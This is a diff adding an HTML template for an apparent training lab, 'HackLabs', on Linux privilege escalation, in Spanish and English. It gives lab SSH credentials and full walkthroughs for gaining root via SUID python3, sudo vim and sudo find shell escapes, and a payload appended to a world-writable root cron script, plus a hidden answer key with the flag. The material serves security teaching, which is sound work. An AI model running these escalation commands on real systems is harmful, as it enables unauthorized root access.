@@ -1,0 +1,389 @@
+{% extends "base.html" %}
+{% block title %}Privilege Escalation – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <!-- Info banner -->
+  <div class="flex items-start gap-3 p-4 rounded-xl mb-6 text-sm"
+       style="background:rgba(var(--hl-primary-rgb),.08);border:1px solid rgba(var(--hl-primary-rgb),.2)">
+    <i class="ph ph-info text-lg flex-shrink-0 mt-0.5" style="color:var(--hl-primary)"></i>
+    <div>
+      <p class="font-semibold mb-1" style="color:var(--hl-primary)">¿Cómo funciona este laboratorio?</p>
+      <p class="text-gray-600 dark:text-gray-400">
+        Conéctate por SSH usando cualquiera de los 5 usuarios del sistema. Cada uno tiene un vector de
+        escalada de privilegios distinto. El objetivo es conseguir acceso <strong>root</strong> y leer
+        <code class="font-mono text-xs px-1 py-0.5 rounded" style="background:rgba(0,0,0,.2)">/root/root.txt</code>.
+      </p>
+      <p class="mt-2 text-gray-500 dark:text-gray-500 text-xs">
+        El usuario <strong>admin</strong> tiene <code class="font-mono">sudo</code> completo — úsalo para
+        inspeccionar la máquina: permisos SUID, sudoers, cron jobs...
+      </p>
+    </div>
+  </div>
+
+  <!-- Connection info -->
+  <div class="hl-card mb-6">
+    <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">
+      <i class="ph ph-terminal-window mr-1"></i> Conexión SSH
+    </div>
+    <div class="hl-code text-xs space-y-1">
+      <div class="text-gray-400"># Conectar por SSH — reemplaza TARGET_IP por la IP del laboratorio</div>
+      <div>ssh admin@TARGET_IP      <span class="text-gray-500"># contraseña: password1 (sudo completo)</span></div>
+      <div>ssh alice@TARGET_IP      <span class="text-gray-500"># contraseña: Password1</span></div>
+      <div>ssh bob@TARGET_IP        <span class="text-gray-500"># contraseña: welcome1</span></div>
+      <div>ssh charlie@TARGET_IP    <span class="text-gray-500"># contraseña: changeme</span></div>
+      <div>ssh dave@TARGET_IP       <span class="text-gray-500"># contraseña: P@ssw0rd</span></div>
+    </div>
+  </div>
+
+  <!-- Tab navigation -->
+  <div class="flex items-center gap-2 mb-6 flex-wrap">
+    <button class="tab-pill active" onclick="switchTab('admin', this)">
+      <i class="ph ph-crown text-sm"></i> admin
+    </button>
+    <button class="tab-pill" onclick="switchTab('alice', this)">
+      <i class="ph ph-user text-sm"></i> alice
+    </button>
+    <button class="tab-pill" onclick="switchTab('bob', this)">
+      <i class="ph ph-user text-sm"></i> bob
+    </button>
+    <button class="tab-pill" onclick="switchTab('charlie', this)">
+      <i class="ph ph-user text-sm"></i> charlie
+    </button>
+    <button class="tab-pill" onclick="switchTab('dave', this)">
+      <i class="ph ph-user text-sm"></i> dave
+    </button>
+  </div>
+
+  <!-- ── admin tab ── -->
+  <div id="tab-admin" class="tab-pane active">
+    <div class="hl-card mb-4">
+      <div class="flex items-center gap-2 mb-3">
+        <span class="text-xs font-semibold uppercase tracking-wider" style="color:var(--hl-primary)">admin — sudo sin restricciones</span>
+        <span class="text-xs px-2 py-0.5 rounded-full font-semibold risk-badge-medium">Reconocimiento</span>
+      </div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4">
+        El usuario <strong>admin</strong> tiene acceso <code class="font-mono text-xs">NOPASSWD: ALL</code> en sudoers.
+        Usa estas técnicas para inspeccionar y entender los vectores de los demás usuarios.
+      </p>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># 1. Conectar</div>
+        <div>ssh admin@TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># 2. Escalar a root</div>
+        <div>sudo su</div>
+        <div class="mt-2 text-gray-400"># 3. Leer flag</div>
+        <div>cat /root/root.txt</div>
+        <div class="mt-3 text-gray-400 border-t border-gray-700 pt-3"># --- Comandos de reconocimiento ---</div>
+        <div>sudo cat /etc/sudoers.d/*          <span class="text-gray-500"># ver privilegios de cada usuario</span></div>
+        <div>find / -perm -4000 -type f 2>/dev/null   <span class="text-gray-500"># buscar binarios SUID</span></div>
+        <div>cat /etc/cron.d/*                  <span class="text-gray-500"># ver cron jobs del sistema</span></div>
+        <div>ls -la /opt/scripts/               <span class="text-gray-500"># ver scripts del sistema</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── alice tab ── -->
+  <div id="tab-alice" class="tab-pane">
+    <div class="hl-card mb-4">
+      <div class="flex items-center gap-2 mb-3">
+        <span class="text-xs font-semibold uppercase tracking-wider" style="color:var(--hl-primary)">alice — SUID en python3</span>
+        <span class="text-xs px-2 py-0.5 rounded-full font-semibold risk-badge-high">High</span>
+      </div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4">
+        El binario <code class="font-mono text-xs">/usr/bin/python3</code> tiene el bit <strong>SUID</strong> activado.
+        Esto permite ejecutar código como root desde una sesión de usuario sin privilegios.
+      </p>
+      <div class="flex items-center gap-2 p-3 rounded-lg text-xs mb-4"
+           style="background:rgba(255,200,0,0.08);border:1px solid rgba(255,200,0,0.2)">
+        <i class="ph ph-lightbulb text-yellow-400 text-sm"></i>
+        <span class="text-yellow-300">Pista: usa <code class="font-mono">find / -perm -4000</code> para descubrir el binario SUID</span>
+      </div>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># 1. Conectar</div>
+        <div>ssh alice@TARGET_IP     <span class="text-gray-500"># password: Password1</span></div>
+        <div class="mt-2 text-gray-400"># 2. Descubrir binarios SUID</div>
+        <div>find / -perm -4000 -type f 2>/dev/null</div>
+        <div class="text-gray-500"># → /usr/bin/python3</div>
+        <div class="mt-2 text-gray-400"># 3. Escalar con python3 SUID</div>
+        <div>python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</div>
+        <div class="mt-1 text-gray-400"># Verificar</div>
+        <div>id</div>
+        <div class="text-gray-500"># → uid=0(root)</div>
+        <div class="mt-2 text-gray-400"># 4. Leer flag</div>
+        <div>cat /root/root.txt</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── bob tab ── -->
+  <div id="tab-bob" class="tab-pane">
+    <div class="hl-card mb-4">
+      <div class="flex items-center gap-2 mb-3">
+        <span class="text-xs font-semibold uppercase tracking-wider" style="color:var(--hl-primary)">bob — sudo misconfiguration (vim)</span>
+        <span class="text-xs px-2 py-0.5 rounded-full font-semibold risk-badge-high">High</span>
+      </div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4">
+        La política de sudo permite a <strong>bob</strong> ejecutar <code class="font-mono text-xs">vim</code> como root sin contraseña.
+        Vim puede lanzar una shell hija con privilegios de root — técnica documentada en <a href="https://gtfobins.github.io/gtfobins/vim/" target="_blank" class="underline" style="color:var(--hl-primary)">GTFOBins</a>.
+      </p>
+      <div class="flex items-center gap-2 p-3 rounded-lg text-xs mb-4"
+           style="background:rgba(255,200,0,0.08);border:1px solid rgba(255,200,0,0.2)">
+        <i class="ph ph-lightbulb text-yellow-400 text-sm"></i>
+        <span class="text-yellow-300">Pista: ejecuta <code class="font-mono">sudo -l</code> para ver qué puede hacer bob</span>
+      </div>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># 1. Conectar</div>
+        <div>ssh bob@TARGET_IP     <span class="text-gray-500"># password: welcome1</span></div>
+        <div class="mt-2 text-gray-400"># 2. Ver privilegios sudo</div>
+        <div>sudo -l</div>
+        <div class="text-gray-500"># → (ALL) NOPASSWD: /usr/bin/vim</div>
+        <div class="mt-2 text-gray-400"># 3. Escalar via GTFOBins — vim</div>
+        <div>sudo vim -c ':!/bin/bash'</div>
+        <div class="mt-1 text-gray-400"># Alternativas:</div>
+        <div>sudo vim -c ':set shell=/bin/bash' -c ':shell'</div>
+        <div>sudo vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'</div>
+        <div class="mt-2 text-gray-400"># 4. Verificar y leer flag</div>
+        <div>id</div>
+        <div>cat /root/root.txt</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── charlie tab ── -->
+  <div id="tab-charlie" class="tab-pane">
+    <div class="hl-card mb-4">
+      <div class="flex items-center gap-2 mb-3">
+        <span class="text-xs font-semibold uppercase tracking-wider" style="color:var(--hl-primary)">charlie — Cron job world-writable</span>
+        <span class="text-xs px-2 py-0.5 rounded-full font-semibold risk-badge-critical">Critical</span>
+      </div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4">
+        Existe un script ejecutado por root cada minuto vía cron
+        (<code class="font-mono text-xs">/opt/scripts/cleanup.sh</code>),
+        pero sus permisos son <strong>777 (world-writable)</strong>. Cualquier usuario puede modificarlo.
+      </p>
+      <div class="flex items-center gap-2 p-3 rounded-lg text-xs mb-4"
+           style="background:rgba(255,200,0,0.08);border:1px solid rgba(255,200,0,0.2)">
+        <i class="ph ph-lightbulb text-yellow-400 text-sm"></i>
+        <span class="text-yellow-300">Pista: lee el archivo <code class="font-mono">note.txt</code> en el home de charlie y revisa <code class="font-mono">/etc/cron.d/</code></span>
+      </div>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># 1. Conectar</div>
+        <div>ssh charlie@TARGET_IP     <span class="text-gray-500"># password: changeme</span></div>
+        <div class="mt-2 text-gray-400"># 2. Seguir la pista</div>
+        <div>cat ~/note.txt</div>
+        <div class="text-gray-500"># → Tip: check what runs automatically on this system...</div>
+        <div class="mt-2 text-gray-400"># 3. Buscar cron jobs del sistema</div>
+        <div>cat /etc/cron.d/*</div>
+        <div class="text-gray-500"># → * * * * * root /opt/scripts/cleanup.sh</div>
+        <div class="mt-2 text-gray-400"># 4. Comprobar permisos del script</div>
+        <div>ls -la /opt/scripts/cleanup.sh</div>
+        <div class="text-gray-500"># → -rwxrwxrwx root root  (world-writable!)</div>
+        <div class="mt-2 text-gray-400"># 5. Inyectar payload (copia bash con SUID)</div>
+        <div>echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh</div>
+        <div class="mt-2 text-gray-400"># 6. Esperar hasta el próximo minuto y escalar</div>
+        <div>watch -n 5 ls -la /tmp/rootbash    <span class="text-gray-500"># esperar a que aparezca</span></div>
+        <div>/tmp/rootbash -p</div>
+        <div class="mt-2 text-gray-400"># 7. Verificar y leer flag</div>
+        <div>id</div>
+        <div class="text-gray-500"># → euid=0(root)</div>
+        <div>cat /root/root.txt</div>
+      </div>
+    </div>
+    <div class="flex items-start gap-2 p-3 rounded-lg text-xs"
+         style="background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2)">
+      <i class="ph ph-clock text-red-400 text-sm flex-shrink-0 mt-0.5"></i>
+      <span class="text-red-300">El cron se ejecuta cada minuto — puede tardar hasta 60 segundos en aparecer <code class="font-mono">/tmp/rootbash</code>.</span>
+    </div>
+  </div>
+
+  <!-- ── dave tab ── -->
+  <div id="tab-dave" class="tab-pane">
+    <div class="hl-card mb-4">
+      <div class="flex items-center gap-2 mb-3">
+        <span class="text-xs font-semibold uppercase tracking-wider" style="color:var(--hl-primary)">dave — sudo misconfiguration (find)</span>
+        <span class="text-xs px-2 py-0.5 rounded-full font-semibold risk-badge-high">High</span>
+      </div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4">
+        La política de sudo permite a <strong>dave</strong> ejecutar <code class="font-mono text-xs">find</code> como root sin contraseña.
+        <code class="font-mono text-xs">find</code> puede ejecutar comandos arbitrarios en archivos encontrados —
+        técnica documentada en <a href="https://gtfobins.github.io/gtfobins/find/" target="_blank" class="underline" style="color:var(--hl-primary)">GTFOBins</a>.
+      </p>
+      <div class="flex items-center gap-2 p-3 rounded-lg text-xs mb-4"
+           style="background:rgba(255,200,0,0.08);border:1px solid rgba(255,200,0,0.2)">
+        <i class="ph ph-lightbulb text-yellow-400 text-sm"></i>
+        <span class="text-yellow-300">Pista: ejecuta <code class="font-mono">sudo -l</code> para ver qué puede hacer dave</span>
+      </div>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># 1. Conectar</div>
+        <div>ssh dave@TARGET_IP     <span class="text-gray-500"># password: P@ssw0rd</span></div>
+        <div class="mt-2 text-gray-400"># 2. Ver privilegios sudo</div>
+        <div>sudo -l</div>
+        <div class="text-gray-500"># → (ALL) NOPASSWD: /usr/bin/find</div>
+        <div class="mt-2 text-gray-400"># 3. Escalar via GTFOBins — find</div>
+        <div>sudo find . -exec /bin/bash \; -quit</div>
+        <div class="mt-1 text-gray-400"># Alternativas:</div>
+        <div>sudo find / -name root.txt -exec /bin/bash \; -quit</div>
+        <div>sudo find . -maxdepth 0 -exec /bin/bash -p \;</div>
+        <div class="mt-2 text-gray-400"># 4. Verificar y leer flag</div>
+        <div>id</div>
+        <div class="text-gray-500"># → uid=0(root)</div>
+        <div>cat /root/root.txt</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Guía completa — Escalada de Privilegios por SSH</h3>
+    <p>Conéctate con cada usuario y sigue su vector específico. El objetivo es leer <code>/root/root.txt</code>.</p>
+
+    <h3>🔑 admin — sudo completo</h3>
+    <pre><code class="language-bash">ssh admin@TARGET_IP   # password: password1
+sudo su
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}
+
+# Reconocimiento de la máquina:
+sudo cat /etc/sudoers.d/*
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/cron.d/*
+ls -la /opt/scripts/</code></pre>
+
+    <h3>🐍 alice — SUID python3</h3>
+    <pre><code class="language-bash">ssh alice@TARGET_IP   # password: Password1
+
+# Descubrir binario SUID
+find / -perm -4000 -type f 2>/dev/null
+# → /usr/bin/python3
+
+# Escalar
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id      # uid=0(root)
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+
+    <h3>📝 bob — sudo vim (GTFOBins)</h3>
+    <pre><code class="language-bash">ssh bob@TARGET_IP   # password: welcome1
+
+# Ver privilegios sudo
+sudo -l
+# → (ALL) NOPASSWD: /usr/bin/vim
+
+# Escalar
+sudo vim -c ':!/bin/bash'
+id      # uid=0(root)
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+
+    <h3>⏱ charlie — Cron job world-writable</h3>
+    <pre><code class="language-bash">ssh charlie@TARGET_IP   # password: changeme
+
+# Seguir pista
+cat ~/note.txt
+# → Tip: check what runs automatically on this system...
+
+# Buscar cron
+cat /etc/cron.d/*
+# → * * * * * root /opt/scripts/cleanup.sh
+
+# Comprobar permisos
+ls -la /opt/scripts/cleanup.sh
+# → -rwxrwxrwx   (world-writable!)
+
+# Inyectar payload
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
+
+# Esperar ~1 minuto y escalar
+/tmp/rootbash -p
+id      # euid=0(root)
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+
+    <h3>🔍 dave — sudo find (GTFOBins)</h3>
+    <pre><code class="language-bash">ssh dave@TARGET_IP   # password: P@ssw0rd
+
+# Ver privilegios sudo
+sudo -l
+# → (ALL) NOPASSWD: /usr/bin/find
+
+# Escalar
+sudo find . -exec /bin/bash \; -quit
+id      # uid=0(root)
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+
+  </div>
+  <div class="lang-content" data-lang="en">
+    <h3>Full guide — SSH Privilege Escalation</h3>
+    <p>Connect with each user and follow their specific vector. The goal is to read <code>/root/root.txt</code>.</p>
+
+    <h3>🔑 admin — full sudo</h3>
+    <pre><code class="language-bash">ssh admin@TARGET_IP   # password: password1
+sudo su
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}
+
+# Recon commands:
+sudo cat /etc/sudoers.d/*
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/cron.d/*
+ls -la /opt/scripts/</code></pre>
+
+    <h3>🐍 alice — SUID python3</h3>
+    <pre><code class="language-bash">ssh alice@TARGET_IP   # password: Password1
+
+find / -perm -4000 -type f 2>/dev/null
+# → /usr/bin/python3
+
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id      # uid=0(root)
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+
+    <h3>📝 bob — sudo vim (GTFOBins)</h3>
+    <pre><code class="language-bash">ssh bob@TARGET_IP   # password: welcome1
+
+sudo -l
+# → (ALL) NOPASSWD: /usr/bin/vim
+
+sudo vim -c ':!/bin/bash'
+id      # uid=0(root)
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+
+    <h3>⏱ charlie — World-writable cron script</h3>
+    <pre><code class="language-bash">ssh charlie@TARGET_IP   # password: changeme
+
+cat ~/note.txt
+cat /etc/cron.d/*
+# → * * * * * root /opt/scripts/cleanup.sh
+
+ls -la /opt/scripts/cleanup.sh
+# → -rwxrwxrwx   (world-writable!)
+
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
+
+# Wait ~1 minute, then:
+/tmp/rootbash -p
+id      # euid=0(root)
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+
+    <h3>🔍 dave — sudo find (GTFOBins)</h3>
+    <pre><code class="language-bash">ssh dave@TARGET_IP   # password: P@ssw0rd
+
+sudo -l
+# → (ALL) NOPASSWD: /usr/bin/find
+
+sudo find . -exec /bin/bash \; -quit
+id      # uid=0(root)
+cat /root/root.txt
+# 🚩 HL{r00t_pr1v3sc_succ3ss}</code></pre>
+
+  </div>
+</div>
+
+{% endblock %}
